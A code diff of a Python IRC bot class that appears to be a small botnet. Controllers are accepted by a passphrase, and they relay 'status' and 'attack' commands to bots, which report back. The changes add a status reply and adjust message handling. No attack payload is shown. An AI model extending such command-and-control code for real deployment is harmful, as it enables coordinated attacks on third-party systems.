@@ -53,35 +53,22 @@ class Bot:
 
     def privateMsg(self, receiver, msg):
         self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
-    
-    def parseMsg(self, msg):
-        prefix = ''
-        trailing = []        
-        if not msg:
-            raise IRCBadMessage("Empty line.")
-        if msg[0] == ':':            
-            prefix, msg = msg[1:].split(' ', 1)
-        if msg.find(' :') != -1:
-            msg, trailing = msg.split(' :', 1)
-            args = msg.split()
-            args.append(trailing)
-        else:
-            args = msg.split()
-        command = args.pop(0)
-        return prefix, command, args
 
     def handleResponse(self, prefix, message):
         if message == self.PHRASE:
             self.acceptedCons.append(prefix)
         if prefix in self.acceptedCons:
             print("from " + prefix + " to do " + message)
+            if message == "status":
+                print("sending back status")
+                self.privateMsg(prefix, "!STATUS! " + self.botNick)
         
 
     def reader(self):
         try:
             while True:
                 response = self.getData()
-                #print(response)   
+                print(response)   
                 if(response != ""):                                         
                         if response.find("PRIVMSG") != -1:                           
                             name = response.split('!',1)[0][1:]
@@ -89,7 +76,7 @@ class Bot:
                             print("message from " + name + ": " + message)   
                             self.handleResponse(name, message)                               
                         elif response.find("PING") != -1:
-                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
+                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
                         elif response.find('433') != -1:
                             self.createNick(self.NICK)
                             self.connectIRC(self.s,self.NICK, self.chan)  
@@ -110,7 +97,10 @@ class Bot:
             # check command
             # send command to bots for them to do
             if (self.command[0] == "status"):
+                self.botlist = []
                 self.sendCommand(self.command[0])
+                time.sleep(5)
+
             elif (self.command[0] == "attack"):
                 if (len(self.command) == 3):
                     self.botsSuccessful = []
